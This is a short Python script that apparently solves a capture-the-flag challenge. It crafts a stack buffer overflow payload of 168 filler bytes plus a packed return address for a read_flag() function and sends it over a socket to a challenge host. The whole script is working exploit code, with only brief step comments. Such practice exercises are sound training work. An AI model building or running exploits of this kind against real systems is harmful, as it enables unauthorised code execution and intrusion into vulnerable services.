import socket
import struct

# Step 1: Calculate the offset
offset = 168

# Step 2: Determine the address of the read_flag() function
# Replace this address with the correct address of the read_flag() function
read_flag_address = 0x000000000000090a

# Step 3: Craft the payload
payload = b'A' * offset + struct.pack('<Q', read_flag_address)

# Step 4: Send the payload via netcat
host = '0.cloud.chals.io'
port = 10198

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.sendall(payload + b'\n')
    response = s.recv(1024)
    print("Response from server:", response)
    s.close()
except Exception as e:
    print("Error:", e)
